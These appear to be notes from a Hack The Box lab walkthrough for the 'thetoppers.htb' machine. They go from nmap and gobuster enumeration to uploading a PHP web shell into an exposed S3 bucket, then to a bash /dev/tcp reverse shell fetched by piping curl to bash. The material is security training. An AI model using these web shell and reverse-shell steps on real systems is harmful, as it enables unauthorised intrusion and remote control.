[[ping]] the host
sudo nmap -sC -sV -p- --min-rate=1000 \[host]
Open host in browser, check source code and see there is an /action_page.php endpoint, server's backend is built using PHP.

echo "\[target host IP] thetoppers.htb" | sudo tee -a /etc/hosts

Enumerate for other subdomains by using [[gobuster]]:
gobuster vhost -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb/ --append-domain

echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts

aws configure
temp for all input
We can list all of the S3 buckets hosted by the server by using the ls command:
aws --endpoint=http://s3.thetoppers.htb s3 ls  
We can also use the ls command to list objects and common prefixes under the specified bucket
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb

We see the files index.php , .htaccess and a directory called images in the specified bucket. It seems like this is the webroot of the website running on port 80 . So the Apache server is using this S3 bucket as storage

We can use the following PHP one-liner which uses the system() function which takes the URL parameter cmd as an input and executes it as a system command

echo '\<?php system($\_GET["cmd"]); ?>' > shell.php

Then, we can upload this PHP shell to the thetoppers.htb S3 bucket using the following command.
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb

The response from the server contains the output of the OS command id , which verified that we have code execution on the box. Thus, let us now try to obtain a reverse shell. Through a reverse shell, we will trigger the remote host to connect back to our local machine's IP address on the specified listening port. We can obtain the tun0 IP address of our local machine using the following command.

ifconfig

Let's get a reverse shell by creating a new file shell.sh containing the following bash reverse shell payload which will connect back to our local machine on port 1337 .
#!/bin/bash 
bash -i >& /dev/tcp/\[IP address]/1337 0>&1

We will start a ncat listener on our local port 1337 using the following command.
nc -nvlp 1337

Let's start a web server on our local machine on port 8000 and host this bash file. It is crucial to note here that this command for hosting the web server must be run from the directory which contains the reverse shell file. So, we must first traverse to the appropriate directory and then run the following command
python3 -m http.server 8000

We can use the curl utility to fetch the bash reverse shell file from our local host and then pipe it to bash in order to execute it. Thus, let us visit the following URL containing the payload in the browser.
http://thetoppers.htb/shell.php?cmd=curl%20CYOUR_IP_ADDRESS:8000/shell.sh|bash